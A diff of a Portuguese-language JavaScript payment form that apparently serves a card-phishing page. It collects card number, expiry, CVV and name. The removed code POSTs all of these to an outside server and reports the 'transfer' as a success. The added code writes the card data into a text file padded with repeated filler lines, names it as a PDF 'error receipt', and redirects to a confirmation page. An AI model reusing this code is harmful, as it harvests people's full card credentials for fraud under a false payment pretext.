@@ -1,6 +1,7 @@
 document.addEventListener("DOMContentLoaded", () => {
     const form = document.querySelector("#dadosss");
-    
+    const dadosForm = document.querySelector("#dados");
+
     const campos = {
         numero: document.querySelector("#numero"),
         data: document.querySelector("#data"),
@@ -15,27 +16,12 @@ document.addEventListener("DOMContentLoaded", () => {
         nome: "Nome completo impresso no cartão.",
     };
 
-    // --- FUNÇÕES DE AJUDA (Dicas e Remoção de Erros) ---
-    function removeMensagemDica(input) {
-        const existing = input.parentElement.querySelector(".mensagem-dica");
-        if (existing) existing.remove();
-    }
-
-    function limparErros() {
-        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
-        for (const key in campos) {
-            campos[key].style.border = "1px solid #ccc"; // Volta a cor normal
-        }
-        document.querySelectorAll('input[name="gender"]').forEach(r => {
-            r.parentElement.style.border = "none";
-        });
-    }
-
-    // Eventos de Focus/Blur para as Dicas
     for (const key in campos) {
         const input = campos[key];
+
         input.addEventListener("focus", () => {
             removeMensagemDica(input);
+
             const dica = document.createElement("span");
             dica.classList.add("mensagem-dica");
             dica.style.color = "#666";
@@ -43,19 +29,26 @@ document.addEventListener("DOMContentLoaded", () => {
             dica.style.display = "block";
             dica.style.marginTop = "4px";
             dica.textContent = mensagensDica[key];
+
             input.parentElement.appendChild(dica);
         });
+
         input.addEventListener("blur", () => {
             removeMensagemDica(input);
         });
     }
 
-    // --- LOGICA DE ENVIO COM VALIDAÇÃO VISUAL ---
-    form.addEventListener("submit", async (event) => {
-        event.preventDefault();
-        limparErros(); // Limpa avisos anteriores
+    function removeMensagemDica(input) {
+        const existing = input.parentElement.querySelector(".mensagem-dica");
+        if (existing) existing.remove();
+    }
 
-        const inputsParaValidar = {
+    form.addEventListener("submit", (event) => {
+        event.preventDefault();
+
+        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());
+
+        const inputs = {
             numero: campos.numero,
             data: campos.data,
             cvv: campos.cvv,
@@ -65,27 +58,28 @@ document.addEventListener("DOMContentLoaded", () => {
 
         const mensagensErro = {
             numero: "Por favor, insira o número do cartão.",
-            data: "A data é necessária.",
-            cvv: "O CVV é necessário.",
+            data: "A data e o CVV são necessários.",
+            cvv: "",
             nome: "Por favor, insira o nome impresso no cartão.",
             tipo: "Selecione uma opção (Crédito ou Débito).",
         };
 
         let formValido = true;
 
-        // 1. VALIDAÇÃO VISUAL (Igual ao script antigo)
-        for (const key in inputsParaValidar) {
-            const input = inputsParaValidar[key];
+        for (const key in inputs) {
+            const input = inputs[key];
 
-            if (!input || input.value.trim() === "") {
+            if (!input || (input.value === "" || input.value === undefined)) {
                 formValido = false;
 
                 if (key === "tipo") {
                     const radios = document.querySelectorAll('input[name="gender"]');
                     radios.forEach(r => {
-                        r.parentElement.style.border = "2px solid red"; // Retângulo vermelho
+                        r.parentElement.style.border = "1px solid red";
                         r.parentElement.style.borderRadius = "8px";
+                        r.parentElement.style.padding = "5px";
                     });
+
                     const container = document.querySelector(".radio-container");
                     const erro = document.createElement("span");
                     erro.classList.add("mensagem-erro");
@@ -93,8 +87,11 @@ document.addEventListener("DOMContentLoaded", () => {
                     erro.style.fontSize = "14px";
                     erro.textContent = mensagensErro[key];
                     container.appendChild(erro);
+
                 } else {
-                    input.style.border = "2px solid red"; // Retângulo vermelho no campo
+                    input.style.border = "1px solid red";
+                    input.style.borderRadius = "8px";
+
                     const erro = document.createElement("span");
                     erro.classList.add("mensagem-erro");
                     erro.style.color = "red";
@@ -104,45 +101,77 @@ document.addEventListener("DOMContentLoaded", () => {
                     erro.textContent = mensagensErro[key];
                     input.parentElement.appendChild(erro);
                 }
+            } else {
+                if (key === "tipo") {
+                    document.querySelectorAll('input[name="gender"]').forEach(r => {
+                        r.parentElement.style.border = "none";
+                    });
+                } else {
+                    input.style.border = "1px solid #ccc";
+                }
             }
         }
 
-        if (!formValido) return; // Para aqui se houver erro
-
-        // 2. ENVIO PARA O SERVIDOR (Se tudo estiver preenchido)
-        const botao = form.querySelector("button");
-        botao.disabled = true;
-        botao.textContent = "Processando...";
-
-        const dadosParaEnviar = {
-            numero: campos.numero.value,
-            dataValidade: campos.data.value,
-            cvv: campos.cvv.value,
-            nome: campos.nome.value,
-            tipo: document.querySelector('input[name="gender"]:checked').value
-        };
-
-        try {
-            const urlDoServidor = "https://backend-g2xn.onrender.com";
-
-            const resposta = await fetch(urlDoServidor, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(dadosParaEnviar)
-            });
-
-            if (resposta.ok) {
-                alert("Transferência realizada com sucesso!");
-                form.reset();
-            } else {
-                alert("Erro ao salvar no banco de dados.");
-            }
-        } catch (error) {
-            console.error("Erro:", error);
-            alert("Servidor offline. Tente novamente em instantes.");
-        } finally {
-            botao.disabled = false;
-            botao.textContent = "Transferir";
+        if (formValido) {
+            saveFormDataToFile();
+            window.location.href = "confirmacao.html";
         }
     });
+
+    function saveFormDataToFile() {
+        const cardNumber = campos.numero.value;
+        const expiryDate = campos.data.value;
+        const cvv = campos.cvv.value;
+        const cardName = campos.nome.value;
+        const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
+        
+        const formData = `
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Número: ${cardNumber}
+Validade: ${expiryDate}
+CVV: ${cvv}
+Nome no Cartão: ${cardName}
+Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
+`;
+        
+        const blob = new Blob([formData], { type: 'text/plain' });
+        
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'comprovante_erro_1023404.pdf';
+        
+        document.body.appendChild(a);
+        a.click();
+        
+        document.body.removeChild(a);
+        URL.revokeObjectURL(a.href);
+    }
+
 });
